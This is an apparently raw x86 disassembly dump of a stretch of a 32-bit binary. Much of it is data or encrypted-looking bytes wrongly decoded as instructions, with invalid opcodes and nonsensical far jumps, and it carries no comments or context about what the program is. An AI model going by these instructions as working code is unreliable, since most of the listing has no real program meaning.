  41d33d:	dec    edi
  41d33e:	cmp    ecx,DWORD PTR [esi+0x30]
  41d341:	dec    esi
  41d342:	inc    ebp
  41d343:	dec    esi
  41d344:	pop    esp
  41d345:	mov    ebp,0xc26fb25f
  41d34a:	outs   dx,BYTE PTR ds:[esi]
  41d34b:	ret    
  41d34c:	jle    0x41d321
  41d34e:	jns    0x41d320
  41d350:	aas    
  41d351:	dec    esi
  41d352:	mov    cs,WORD PTR [edi+0x30]
  41d355:	dec    esi
  41d356:	lods   al,BYTE PTR ds:[esi]
  41d357:	dec    edi
  41d358:	cmp    eax,0x394f804e
  41d35d:	dec    esi
  41d35e:	lods   al,BYTE PTR ds:[esi]
  41d35f:	dec    edi
  41d360:	cmp    cl,BYTE PTR [esi+0x30]
  41d363:	dec    esi
  41d364:	inc    esi
  41d365:	dec    esi
  41d366:	pop    esp
  41d367:	int    0x5f
  41d369:	ret    0xd26f
  41d36c:	outs   dx,BYTE PTR ds:[esi]
  41d36d:	sar    DWORD PTR [esi-0x1d],cl
  41d370:	jns    0x41d352
  41d372:	aas    
  41d373:	dec    esi
  41d374:	mov    cs,WORD PTR [edi+0x30]
  41d377:	dec    esi
  41d378:	lods   al,BYTE PTR ds:[esi]
  41d379:	dec    edi
  41d37a:	cmp    eax,0x394f834e
  41d37f:	dec    esi
  41d380:	mov    ds:0x304e3a4f,al
  41d385:	dec    esi
  41d386:	inc    esp
  41d387:	dec    esi
  41d388:	pop    esp
  41d389:	fstp   QWORD PTR [edi-0x2e]
  41d38c:	outs   dx,DWORD PTR ds:[esi]
  41d38d:	loop   0x41d3fd
  41d38f:	jecxz  0x41d40f
  41d391:	repz jns 0x41d384
  41d394:	aas    
  41d395:	dec    esi
  41d396:	lea    ecx,[edi+0x30]
  41d399:	dec    esi
  41d39a:	lahf   
  41d39b:	dec    edi
  41d39c:	cmp    eax,0x3c4fa04e
  41d3a1:	dec    esi
  41d3a2:	xor    BYTE PTR [esi+0x3f],cl
  41d3a5:	dec    esi
  41d3a6:	pop    esp
  41d3a7:	in     eax,dx
  41d3a8:	pop    edi
  41d3a9:	loop   0x41d41a
  41d3ab:	repnz outs dx,BYTE PTR ds:[esi]
  41d3ad:	repz jle 0x41d3b3
  41d3b0:	jns    0x41d3b2
  41d3b2:	jle    0x41d3c7
  41d3b4:	jns    0x41d3c6
  41d3b6:	cmp    al,0x4e
  41d3b8:	jg     0x41d408
  41d3ba:	xor    BYTE PTR [esi-0x65],cl
  41d3bd:	dec    edi
  41d3be:	xor    cl,BYTE PTR [esi-0x80]
  41d3c1:	dec    edi
  41d3c2:	cmp    al,0x4e
  41d3c4:	lods   eax,DWORD PTR ds:[esi]
  41d3c5:	dec    edi
  41d3c6:	cmp    ecx,DWORD PTR [esi+0x30]
  41d3c9:	dec    esi
  41d3ca:	inc    ebp
  41d3cb:	dec    esi
  41d3cc:	pop    esp
  41d3cd:	or     eax,0x126f025f
  41d3d2:	outs   dx,BYTE PTR ds:[esi]
  41d3d3:	adc    edi,DWORD PTR [esi+0x23]
  41d3d6:	jns    0x41d3f8
  41d3d8:	aas    
  41d3d9:	dec    esi
  41d3da:	add    BYTE PTR [eax],al
  41d3dc:	rol    BYTE PTR fs:[ecx+0x0],cl
  41d3e0:	pop    eax
  41d3e1:	aam    0x41
  41d3e3:	add    BYTE PTR [eax-0x2c],ah
  41d3e6:	inc    ecx
  41d3e7:	add    al,ch
  41d3e9:	aad    0x41
  41d3eb:	add    BYTE PTR [ebp+edx*8+0x41],dl
  41d3ef:	add    al,bl
  41d3f1:	aad    0x41
  41d3f3:	add    BYTE PTR [eax-0x2c],al
  41d3f6:	inc    ecx
  41d3f7:	add    BYTE PTR [esp+edx*8+0x41],al
  41d3fb:	add    ah,dl
  41d3fd:	aad    0x41
  41d3ff:	add    BYTE PTR [eax+0xd0041d4],ch
  41d405:	test   eax,0xba36f89c
  41d40a:	pushf  
  41d40b:	clc    
  41d40c:	pop    esp
  41d40d:	aam    0x41
  41d40f:	add    BYTE PTR [edx*8-0x2adfffbf],cl
  41d416:	inc    ecx
  41d417:	add    BYTE PTR [edx*8-0x2ac3ffbf],ch
  41d41e:	inc    ecx
  41d41f:	add    BYTE PTR [esp+edx*8-0x2d9fffbf],dl
  41d426:	inc    ecx
  41d427:	add    BYTE PTR [esp+edx*8-0x2b5bffbf],dh
  41d42e:	inc    ecx
  41d42f:	add    ah,ch
  41d431:	aad    0x41
  41d433:	add    BYTE PTR [esi+0x19f89c85],dh
  41d439:	or     edx,DWORD PTR [edi]
  41d43b:	sub    DWORD PTR [eax-0x2c],0x1c140041
  41d442:	push   ss
  41d443:	or     DWORD PTR [eax],0x7050d
  41d449:	add    BYTE PTR [eax+0x0],al
  41d44c:	cmp    al,BYTE PTR [edx+0x3e]
  41d44f:	ds retf 0x4247
  41d453:	add    BYTE PTR [ebp+0x55],ch
  41d456:	inc    esp
  41d457:	imul   ecx,DWORD PTR [eax],0x86275fa
  41d45d:	in     eax,dx
  41d45e:	inc    BYTE PTR [edi]
  41d460:	aas    
  41d461:	cli    
  41d462:	mov    ds:0x41d45005,eax
  41d467:	add    BYTE PTR [ebp-0x4a07636b],dh
  41d46d:	xchg   esi,eax
  41d46e:	pushf  
  41d46f:	clc    
  41d470:	mov    ah,0x95
  41d472:	pushf  
  41d473:	clc    
  41d474:	mov    ebx,0xbaf89c95
  41d479:	xchg   ebp,eax
  41d47a:	pushf  
  41d47b:	clc    
  41d47c:	mov    ecx,0xb8f89c95
  41d481:	xchg   ebp,eax
  41d482:	pushf  
  41d483:	clc    
  41d484:	mov    edi,0xbef89c95
  41d489:	xchg   ebp,eax
  41d48a:	pushf  
  41d48b:	clc    
  41d48c:	mov    ebp,0xa6f89c95
  41d491:	xchg   ebp,eax
  41d492:	pushf  
  41d493:	clc    
  41d494:	jmp    0x41d2:0x586003f9
  41d49b:	add    BYTE PTR [eax+edx*1+0x77530042],cl
  41d4a2:	jbe    0x41d4f4
  41d4a4:	mov    dh,0x85
  41d4a6:	pushf  
  41d4a7:	clc    
  41d4a8:	sbb    ecx,ebp
  41d4aa:	push   eax
  41d4ab:	pop    es
  41d4ac:	es pop es
  41d4ae:	add    BYTE PTR [eax],al
  41d4b0:	push   esp
  41d4b1:	rol    BYTE PTR [ecx+0x0],cl
  41d4b4:	sbb    ecx,DWORD PTR [ebx]
  41d4b6:	add    al,0xe
	...
  41d4e8:	mov    WORD PTR [eax],ss
  41d4ea:	inc    edx
  41d4eb:	add    BYTE PTR [esi+0x67f89c85],dh
  41d4f1:	pushw  0x68
  41d4f4:	addr16 push 0x67
  41d4f7:	pushw  0x6b6a
  41d4fb:	push   0x676b67
	...
  41d508:	es aas 
  41d50a:	inc    eax
  41d50b:	add    BYTE PTR [ebp-0x5db060b1],ah
  41d511:	dec    edi
  41d512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d513:	dec    edi
  41d514:	lahf   
  41d515:	dec    edi
  41d516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d517:	dec    edi
  41d518:	ins    DWORD PTR es:[edi],dx
  41d519:	dec    esi
  41d51a:	bound  ecx,QWORD PTR [esi+0x30]
  41d51d:	dec    esi
  41d51e:	add    BYTE PTR [eax],al
  41d520:	cdq    
  41d521:	dec    edi
  41d522:	pushf  
  41d523:	dec    edi
  41d524:	fwait
  41d525:	dec    edi
  41d526:	ins    DWORD PTR es:[edi],dx
  41d527:	dec    esi
  41d528:	bound  ecx,QWORD PTR [esi+0x30]
  41d52b:	dec    esi
  41d52c:	scas   eax,DWORD PTR es:[edi]
  41d52d:	dec    edi
  41d52e:	lods   eax,DWORD PTR ds:[esi]
  41d52f:	dec    edi
  41d530:	lahf   
  41d531:	dec    edi
  41d532:	mov    ds:0x624e6d4f,al
  41d537:	dec    esi
  41d538:	xor    BYTE PTR [esi+0x0],cl
  41d53b:	add    BYTE PTR [ebp-0x5bb067b1],ch
  41d541:	dec    edi
  41d542:	test   eax,0xa04f934f
  41d547:	dec    edi
  41d548:	fwait
  41d549:	dec    edi
  41d54a:	xor    BYTE PTR [esi+0x0],cl
  41d54d:	add    BYTE PTR [eax],al
  41d54f:	add    BYTE PTR [eax],al
  41d551:	add    BYTE PTR [eax],al
  41d553:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  41d55a:	mov    WORD PTR [ebp-0x32734274],gs
  41d560:	mov    ebp,ds
  41d562:	mov    ebp,gs
  41d564:	mov    ebp,?
  41d566:	mov    WORD PTR ds:0x2d8c1d8c,cs
  41d56c:	mov    WORD PTR ds:0x6d8c5d8c,?
  41d572:	mov    WORD PTR [edx-0x74],?
  41d575:	jae    0x41d503
  41d577:	jo     0x41d505
  41d579:	jno    0x41d507
  41d57b:	jbe    0x41d509
  41d57d:	ja     0x41d50b
  41d57f:	je     0x41d50d
  41d581:	jne    0x41d50f
  41d583:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  41d58a:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  41d590:	lods   al,BYTE PTR ds:[esi]
  41d591:	jge    0x41d54f
  41d593:	jge    0x41d533
  41d595:	(bad)  
  41d596:	jns    0x41d60b
  41d598:	mov    ecx,0x7d738cb1
  41d59d:	ins    DWORD PTR es:[edi],dx
  41d59e:	enter  0x9fc6,0x26
  41d5a2:	jb     0x41d5a7
  41d5a4:	test   eax,0xb956bb17
  41d5a9:	hlt    
  41d5aa:	test   al,0x37
  41d5ac:	test   al,0x7e
  41d5ae:	fnstenv [ecx-0x6a]
  41d5b1:	mov    cl,0x6a
  41d5b3:	push   0xffffffce
  41d5b5:	or     BYTE PTR [edx],bl
  41d5b7:	xlat   BYTE PTR ds:[ebx]
  41d5b8:	out    dx,eax
  41d5b9:	add    eax,0x9321d7aa
  41d5be:	scas   al,BYTE PTR es:[edi]
  41d5bf:	adc    DWORD PTR [esi],esp
  41d5c1:	jge    0x41d5e6
  41d5c3:	fidiv  WORD PTR [edi]
  41d5c5:	leave  
  41d5c6:	hlt    
  41d5c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5c8:	cmp    ax,0x1fc8
  41d5cc:	mov    dh,cl
  41d5ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5cf:	(bad)  
  41d5d0:	and    DWORD PTR [eax],ebx
  41d5d2:	and    DWORD PTR [ecx-0x18],esi
  41d5d5:	(bad)  [ebx+0x7]
  41d5d8:	cmc    
  41d5d9:	enter  0x301a,0x40
  41d5dd:	adc    BYTE PTR [edx+0x0],al
  41d5e0:	jno    0x41d648
  41d5e2:	jp     0x41d652
  41d5e4:	dec    eax
  41d5e5:	aam    0x41
  41d5e7:	add    BYTE PTR [esp+edx*8-0x12f7ffbf],ch
  41d5ee:	adc    al,BYTE PTR [edi]
  41d5f0:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  41d5f7:	ins    BYTE PTR es:[edi],dx
  41d5f8:	push   0x49657557
  41d5fd:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  41d603:	push   edi
  41d604:	ins    BYTE PTR es:[edi],dx
  41d605:	inc    edx
  41d606:	push   0x76666a73
  41d60b:	inc    edx
  41d60c:	jo     0x41d657
  41d60e:	dec    ebp
  41d60f:	dec    ebp
  41d610:	pop    edx
  41d611:	jp     0x41d66d
  41d613:	jbe    0x41d65b
  41d615:	pop    ecx
  41d616:	jo     0x41d690
	...
  41d62c:	inc    ebp
  41d62d:	push   edx
  41d62e:	jb     0x41d6a4
  41d630:	inc    esi
  41d631:	je     0x41d674
  41d633:	inc    esi
  41d634:	jae    0x41d6ac
  41d636:	dec    ebx
  41d637:	gs inc edx
  41d639:	inc    bx
  41d63b:	push   ebp
  41d63c:	jno    0x41d6b4
  41d63e:	ja     0x41d6a7
  41d640:	dec    edi
  41d641:	dec    esp
  41d642:	dec    ebp
  41d643:	inc    edx
  41d644:	jno    0x41d6b7
  41d646:	jae    0x41d69b
  41d648:	dec    eax
  41d649:	inc    ebp
  41d64a:	inc    esp
  41d64b:	inc    esp
  41d64c:	push   ecx
  41d64d:	dec    edx
  41d64e:	ins    BYTE PTR es:[edi],dx
  41d64f:	dec    ebx
  41d650:	jbe    0x41d6c0
  41d652:	pop    eax
  41d653:	jbe    0x41d6a0
  41d655:	inc    ecx
  41d656:	fs gs jno 0x41d6c7
  41d65a:	push   ebx
  41d65b:	inc    ecx
  41d65c:	add    BYTE PTR [eax],al
  41d65e:	inc    ebx
  41d65f:	outs   dx,BYTE PTR ds:[esi]
  41d660:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  41d664:	push   edx
  41d665:	push   ecx
  41d666:	push   0x74000064
  41d66b:	jne    0x41d6e2
  41d66d:	ins    DWORD PTR es:[edi],dx
  41d66e:	push   ecx
  41d66f:	push   eax
  41d670:	jo     0x41d6ec
  41d672:	addr16 jo 0x41d6cb
  41d675:	pop    eax
  41d676:	add    BYTE PTR [eax],al
  41d678:	push   ecx
  41d679:	pop    ecx
  41d67a:	inc    ebx
  41d67b:	inc    edx
  41d67c:	outs   dx,BYTE PTR ds:[esi]
  41d67d:	popa   
  41d67e:	imul   eax,DWORD PTR [edx+0x61],0x6b
  41d682:	jne    0x41d6f2
  41d684:	dec    ebx
  41d685:	add    BYTE PTR [ecx+0x45],bh
  41d688:	bound  ebp,QWORD PTR [ecx+0x46]
  41d68b:	dec    ecx
  41d68c:	ja     0x41d6d3
  41d68e:	dec    eax
  41d68f:	inc    ebp
  41d690:	inc    edx
  41d691:	push   ebx
  41d692:	add    BYTE PTR [eax],al
  41d694:	je     0x41d6f9
  41d696:	bound  esp,QWORD PTR [edi+0x78]
  41d699:	dec    eax
  41d69a:	bound  edx,QWORD PTR [ebx+0x43]
  41d69d:	pop    eax
  41d69e:	outs   dx,DWORD PTR ds:[esi]
  41d69f:	push   0x4355
  41d6a4:	inc    edi
  41d6a5:	gs ins BYTE PTR es:[edi],dx
  41d6a7:	dec    esp
  41d6a8:	js     0x41d712
  41d6aa:	inc    edx
  41d6ab:	js     0x41d6f3
  41d6ad:	arpl   WORD PTR [eax],ax
  41d6af:	add    BYTE PTR [eax],al
  41d6b1:	add    BYTE PTR [eax],al
  41d6b3:	add    BYTE PTR [edx+0x70],cl
  41d6b6:	jb     0x41d730
  41d6b8:	outs   dx,DWORD PTR ds:[esi]
  41d6b9:	pop    eax
  41d6ba:	dec    ebx
  41d6bb:	push   esp
  41d6bc:	dec    esp
  41d6bd:	jns    0x41d70a
  41d6bf:	js     0x41d739
  41d6c1:	outs   dx,BYTE PTR ds:[esi]
  41d6c2:	pop    ecx
  41d6c3:	jae    0x41d733
  41d6c5:	push   0x43644448
  41d6ca:	arpl   WORD PTR [edx+0x55],sp
  41d6cd:	push   0x42504e67
  41d6d2:	push   ebp
  41d6d3:	je     0x41d74a
  41d6d5:	addr16 dec edi
  41d6d7:	dec    esp
  41d6d8:	inc    edx
  41d6d9:	ins    DWORD PTR es:[edi],dx
  41d6da:	inc    esi
  41d6db:	inc    esi
  41d6dc:	inc    esi
  41d6dd:	arpl   WORD PTR [edx+0x47],bx
  41d6e0:	push   ebp
  41d6e1:	inc    ebx
  41d6e2:	popa   
  41d6e3:	push   edx
  41d6e4:	dec    esp
  41d6e5:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  41d6ec:	push   ecx
  41d6ed:	push   ebx
  41d6ee:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  41d6f5:	dec    edx
  41d6f6:	jns    0x41d761
  41d6f8:	push   edx
  41d6f9:	inc    ebx
  41d6fa:	jo     0x41d771
  41d6fc:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  41d700:	fs push ebx
  41d702:	inc    ebx
  41d703:	push   ebp
  41d704:	push   eax
  41d705:	ja     0x41d781
  41d707:	jp     0x41d756
  41d709:	push   esi
  41d70a:	arpl   WORD PTR gs:[ecx+0x45],si
  41d70e:	dec    edx
  41d70f:	dec    esi
  41d710:	data16 ja 0x41d761
  41d713:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
  41d71a:	dec    esp
  41d71b:	cmp    ebx,ebp
  41d71d:	dec    esp
  41d71e:	lods   eax,DWORD PTR ds:[esi]
  41d71f:	out    dx,al
  41d720:	mov    ebp,0xa53ddffb
  41d725:	js     0x41d6e0
  41d727:	(bad)  
  41d728:	out    0xc1,eax
  41d72a:	(bad)  
  41d72b:	bound  edx,QWORD PTR [esi+0xab0001]
  41d731:	add    BYTE PTR [eax],al
  41d733:	mov    dh,BYTE PTR [eax-0x3f]
  41d736:	pop    ebp
  41d737:	mov    edi,0x1f1a4241
  41d73c:	sar    DWORD PTR [edi+edx*4+0x29],0xa6
  41d741:	mov    ds:0x89e3f1a6,eax
  41d746:	and    BYTE PTR [edx],0xf2
  41d749:	into   
  41d74a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d74b:	jno    0x41d6e5
  41d74d:	mov    fs,WORD PTR [esp+ebx*2]
  41d750:	push   edx
  41d751:	add    dh,dl
  41d753:	sbb    DWORD PTR [edi+0x48],esp
  41d756:	ret    0xc860
  41d759:	cmp    eax,0xbe059304
  41d75e:	(bad)  
  41d75f:	js     0x41d704
  41d761:	push   ebp
  41d762:	stc    
  41d763:	retf   
  41d764:	cwde   
  41d765:	jno    0x41d757
  41d767:	xchg   ebp,eax
  41d768:	push   0x58
  41d76a:	xlat   BYTE PTR ds:[ebx]
  41d76b:	lahf   
  41d76c:	pop    es
  41d76d:	inc    esi
  41d76e:	sti    
  41d76f:	xor    DWORD PTR [ecx+0x31],esi
  41d772:	pop    edi
  41d773:	mov    cl,BYTE PTR [eax-0x67]
  41d776:	out    dx,eax
  41d777:	loope  0x41d74b
  41d779:	jbe    0x41d748
  41d77b:	test   DWORD PTR [ecx+0x68],0x6dd9193a
  41d782:	sbb    ecx,DWORD PTR [edx+0x31b9cc4d]
  41d788:	mov    dl,BYTE PTR [edx-0x39]
  41d78b:	popf   
  41d78c:	shl    ch,0x38
  41d78f:	sub    BYTE PTR [esi+0x2d],al
  41d792:	leave  
  41d793:	dec    ebx
  41d794:	(bad)  
  41d795:	sbb    esp,DWORD PTR [edi-0x7ded03cd]
  41d79b:	pop    ds
  41d79c:	jmp    0x650b62c3
  41d7a1:	imul   ecx,DWORD PTR [ebx+0x2470851],0xb597a7b8
  41d7ab:	xor    eax,0xc2b41d99
  41d7b0:	lods   al,BYTE PTR ds:[esi]
  41d7b1:	clc    
  41d7b2:	mov    edx,0x1f005795
  41d7b7:	xchg   esp,eax
  41d7b8:	jnp    0x41d82a
  41d7ba:	push   esi
  41d7bb:	daa    
  41d7bc:	push   ebp
  41d7bd:	jnp    0x41d7c2
  41d7bf:	(bad)  
  41d7c0:	cli    
  41d7c1:	inc    edx
  41d7c2:	xor    al,0x41
  41d7c4:	cmp    BYTE PTR [ecx],dl
  41d7c6:	out    dx,al
  41d7c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7c8:	cdq    
  41d7c9:	or     eax,0x788ee9e6
  41d7ce:	loope  0x41d7a9
  41d7d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7d1:	iret   
  41d7d2:	es gs mov esi,0xe58bf706
  41d7d9:	(bad)  
  41d7da:	test   al,0x55
  41d7dc:	sbb    ecx,edi
	...
  41d7ea:	add    BYTE PTR [eax],ch
  41d7ec:	mov    dl,0xa5
  41d7ee:	push   edx
  41d7ef:	mov    edi,0x7cfaff57
  41d7f4:	xlat   BYTE PTR fs:[ebx]
  41d7f6:	push   esi
  41d7f7:	pusha  
  41d7f8:	call   0x1:0x970d397c
  41d7ff:	stos   DWORD PTR es:[edi],eax
  41d800:	add    BYTE PTR [eax],al
  41d802:	add    BYTE PTR [edx],bh
  41d804:	xchg   esp,eax
  41d805:	fiadd  WORD PTR [ecx-0x7a]
  41d808:	repnz in eax,dx
  41d80a:	mov    edx,0x99cd0528
  41d80f:	daa    
  41d810:	jno    0x41d887
  41d812:	loopne 0x41d802
  41d814:	in     al,0x65
  41d816:	inc    esp
  41d817:	cmp    eax,0x5e71e3a6
  41d81c:	cmp    al,BYTE PTR [edi-0x69]
  41d81f:	out    0x28,al
  41d821:	inc    ecx
  41d822:	inc    edx
  41d823:	cdq    
  41d824:	loop   0x41d7eb
  41d826:	pop    es
  41d827:	jmp    0x16b8:0x1de27129
  41d82e:	and    al,0x52
  41d830:	add    DWORD PTR [eax+0x70bfd64c],ebp
  41d836:	inc    esp
  41d837:	cwde   
  41d838:	inc    eax
  41d839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d83a:	mov    ch,0x77
  41d83c:	mov    ds:0xf681321d,al
  41d841:	push   esi
  41d842:	jmp    0x41d848
  41d844:	seto   BYTE PTR fs:[edi+0x6f]
  41d849:	sahf   
  41d84a:	mov    DWORD PTR [edi],ecx
  41d84c:	jne    0x41d839
  41d84e:	imul   bp,dx,0x2f8e
  41d853:	mov    eax,ds:0x7f2cf37d
  41d858:	push   edx
  41d859:	xchg   esp,eax
  41d85a:	ret    
  41d85b:	inc    ebx
  41d85c:	enter  0x70e1,0x3b
  41d860:	cmp    edi,ebp
  41d862:	pop    esi
  41d863:	dec    BYTE PTR [ebp+0xb]
  41d866:	in     al,dx
  41d867:	loope  0x41d8db
  41d869:	add    al,0x43
  41d86b:	mov    WORD PTR [ebx],cs
  41d86d:	adc    bl,bh
  41d86f:	jmp    0x9dae:0xa52ea164
  41d876:	pop    ss
  41d877:	nop
  41d878:	jl     0x41d840
  41d87a:	xchg   ebp,eax
  41d87b:	iret   
  41d87c:	imul   ebp,DWORD PTR [ebx-0x14a7200b],0xe76aa83b
  41d886:	nop
  41d887:	and    DWORD PTR [eax-0x3401bd95],0xd62c46d
  41d891:	retf   0xb52d
  41d894:	stc    
  41d895:	out    dx,al
  41d896:	dec    edx
  41d897:	add    DWORD PTR [ebx-0x445608f3],esp
  41d89d:	push   0x4505f108
  41d8a2:	(bad)  
  41d8a3:	mov    al,ds:0x74c358f3
  41d8a8:	je     0x41d8d6
  41d8aa:	je     0x41d892
  41d8ac:	pop    eax
  41d8ad:	stos   BYTE PTR es:[edi],al
	...
  41d8ba:	add    BYTE PTR [ebx-0x7e80ab],dh
  41d8c0:	stos   DWORD PTR es:[edi],eax
  41d8c1:	push   DWORD PTR [edi-0x42]
  41d8c4:	xchg   esi,eax
  41d8c5:	push   0x40d0b057
  41d8ca:	mov    WORD PTR [eax-0x54fffe69],?
  41d8d0:	add    BYTE PTR [eax],al
  41d8d2:	add    BYTE PTR [eax-0x69],dh
  41d8d5:	outs   dx,BYTE PTR ds:[esi]
  41d8d6:	and    al,0xfb
  41d8d8:	adc    ah,BYTE PTR [ebp-0x61]
  41d8db:	inc    ebx
  41d8dc:	adc    DWORD PTR [esi+eiz*8-0x1a],ecx
  41d8e0:	dec    ebp
  41d8e1:	out    dx,al
  41d8e2:	leave  
  41d8e3:	sub    esi,DWORD PTR [esi+edi*2+0x2e]
  41d8e7:	ror    BYTE PTR [ebx+0x3],0xf
  41d8eb:	fsubr  st,st(5)
  41d8ed:	xchg   ecx,eax
  41d8ee:	daa    
  41d8ef:	bound  ecx,QWORD PTR [ecx+ecx*4]
  41d8f2:	pop    es
  41d8f3:	std    
  41d8f4:	jp     0x41d8b1
  41d8f6:	enter  0xd428,0xed
  41d8fa:	sbb    ebx,edx
  41d8fc:	pushf  
  41d8fd:	lahf   
  41d8fe:	xchg   ecx,eax
  41d8ff:	scas   al,BYTE PTR es:[edi]
  41d900:	add    eax,0xd4afbc3b
  41d905:	ds inc edi
  41d907:	sbb    ebx,ecx
  41d909:	push   ecx
  41d90a:	stos   BYTE PTR es:[edi],al
  41d90b:	pop    eax
  41d90c:	mov    esi,0xac4cb4b8
  41d911:	sbb    BYTE PTR [ebx-0x3714a783],ah
  41d917:	or     esi,0x2e
  41d91a:	dec    edx
  41d91b:	mov    ds:0x10005115,al
  41d920:	cmp    ebx,esp
  41d922:	pop    es
  41d923:	and    eax,0x8d582701
  41d928:	hlt    
  41d929:	or     esi,DWORD PTR [ecx+edi*2]
  41d92c:	mov    dh,0x5a
  41d92e:	pop    es
  41d92f:	shl    ebp,cl
  41d931:	cmp    eax,0x3d199ad2
  41d936:	mov    dh,0xc4
  41d938:	sbb    esi,DWORD PTR [ecx]
  41d93a:	mov    ds:0x6b6198a6,al
  41d93f:	enter  0x21cc,0x46
  41d943:	add    ebp,ecx
  41d945:	inc    ebx
  41d946:	loopne 0x41d947
  41d948:	jecxz  0x41d928
  41d94a:	xor    edx,ecx
  41d94c:	mov    edx,0xdb8f0c9d
  41d951:	ret    0x2b83
  41d954:	int    0x55
  41d956:	xor    DWORD PTR [esi-0xff684e9],0xfb50d8eb
  41d960:	jns    0x41d9de
  41d962:	dec    edx
  41d963:	mov    esp,DWORD PTR [ebx+0x6]
  41d966:	mov    edx,0xe751d328
  41d96b:	arpl   ax,bp
  41d96d:	cmp    bl,bh
  41d96f:	xchg   ch,dh
  41d971:	push   0x28
  41d973:	inc    esp
  41d974:	jg     0x41d943
  41d976:	sbb    al,0x41
  41d978:	adc    dl,BYTE PTR [esi]
  41d97a:	loopne 0x41d96c
  41d97c:	out    dx,eax
  41d97d:	add    BYTE PTR gs:[eax],al
	...
  41d988:	add    BYTE PTR [eax],al
  41d98a:	add    BYTE PTR [eax],bh
  41d98c:	(bad)  
  41d98d:	cmp    ah,BYTE PTR [esi+edi*8]
  41d990:	in     al,dx
  41d991:	fimul  WORD PTR ds:[edi+0x32ac6bd5]
  41d998:	test   eax,ebp
  41d99a:	push   0x63
  41d99c:	cwde   
  41d99d:	add    DWORD PTR [eax],eax
  41d99f:	stos   DWORD PTR es:[edi],eax
  41d9a0:	add    BYTE PTR [eax],al
  41d9a2:	add    BYTE PTR [esi],dh
  41d9a4:	fwait
  41d9a5:	dec    ebp
  41d9a6:	test   bl,bh
  41d9a8:	mov    al,ds:0x4ef60147
  41d9ad:	cld    
  41d9ae:	jbe    0x41d950
  41d9b0:	cmp    ebx,0xfb36bb25
  41d9b6:	push   cs
  41d9b7:	inc    esi
  41d9b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9b9:	mov    dl,BYTE PTR [esi]
  41d9bb:	add    bl,dl
  41d9bd:	mov    eax,0xd836cead
  41d9c2:	call   0x38ea:0x8a9114b1
  41d9c9:	sub    cl,al
  41d9cb:	inc    ebp
  41d9cc:	push   esi
  41d9cd:	ret    
  41d9ce:	nop
  41d9cf:	pop    eax
  41d9d0:	mov    ah,0x7b
  41d9d2:	or     ecx,DWORD PTR [esi+ebp*2+0x2d]
  41d9d6:	and    dh,BYTE PTR fs:[ebx]
  41d9d9:	fdivr  st,st(3)
  41d9db:	idiv   esi
  41d9dd:	ficom  DWORD PTR [ebx+0x4cac4da3]
  41d9e3:	dec    ebx
  41d9e4:	xchg   edi,eax
  41d9e5:	jl     0x41d992
  41d9e7:	push   edx
  41d9e8:	sub    eax,0x790d5346
  41d9ed:	push   esp
  41d9ee:	imul   esp,DWORD PTR [ecx],0x46
  41d9f1:	rcr    DWORD PTR [ebx+0x68334382],cl
  41d9f7:	and    bh,BYTE PTR [edi-0xd49e47]
  41d9fd:	sbb    eax,DWORD PTR [eax-0x29ad3592]
  41da03:	pop    eax
  41da04:	add    eax,0xc659e36e
  41da09:	add    ecx,ebp
  41da0b:	out    dx,al
  41da0c:	add    DWORD PTR [ebx+0x27],edx
  41da0f:	repz xchg ebp,eax
  41da11:	enter  0x6bcf,0x9d
  41da15:	sub    eax,0x35c0cf6a
  41da1a:	and    al,0xc
  41da1c:	dec    esi
  41da1d:	gs scas al,BYTE PTR es:[edi]
  41da1f:	push   eax
  41da20:	add    ebp,ebp
  41da22:	out    0x8f,eax
  41da24:	dec    esp
  41da25:	ss xchg edx,eax
  41da27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da28:	jno    0x41da6f
  41da2a:	pop    edi
  41da2b:	scas   al,BYTE PTR es:[edi]
  41da2c:	inc    esi
  41da2d:	shr    DWORD PTR [eax+0x32],cl
  41da30:	in     eax,0x65
  41da32:	mov    al,0xd9
  41da34:	pop    es
  41da35:	add    ecx,edx
  41da37:	xchg   ecx,eax
  41da38:	std    
  41da39:	cmp    DWORD PTR [ecx-0x47],edi
  41da3c:	call   0x947e6de6
  41da41:	mov    dl,bl
  41da43:	cmovp  edx,DWORD PTR [ecx-0x7ac1f7b7]
  41da4a:	sti    
  41da4b:	fidiv  DWORD PTR [esi]
  41da4d:	mov    edx,0x0
	...
  41da5a:	add    cl,bl
  41da5c:	mov    dh,0x66
  41da5e:	sbb    ebp,DWORD PTR [edi-0x25]
  41da61:	std    
  41da62:	neg    BYTE PTR [esi]
  41da64:	sub    esp,DWORD PTR [ebx-0x23]
  41da67:	neg    BYTE PTR [eax-0x7f]
  41da6a:	pop    ebp
  41da6b:	push   cs
  41da6c:	cdq    
  41da6d:	add    DWORD PTR [eax],eax
  41da6f:	stos   DWORD PTR es:[edi],eax
  41da70:	add    BYTE PTR [eax],al
  41da72:	add    bh,ch
  41da74:	inc    ebp
  41da75:	cmp    BYTE PTR [edi-0x25],bl
  41da78:	bound  edi,QWORD PTR [edx-0x1b213ce0]
  41da7e:	outs   dx,DWORD PTR ds:[esi]
  41da7f:	inc    edi
  41da80:	loope  0x41da80
  41da82:	pop    esp
  41da83:	pushf  
  41da84:	sub    DWORD PTR [edi+ebp*8],esp
  41da87:	bound  edx,QWORD PTR [ecx+0x7996833b]
  41da8d:	lods   eax,DWORD PTR ds:[esi]
  41da8e:	dec    esi
  41da8f:	adc    cl,BYTE PTR [esi+0x4e]
  41da92:	aas    
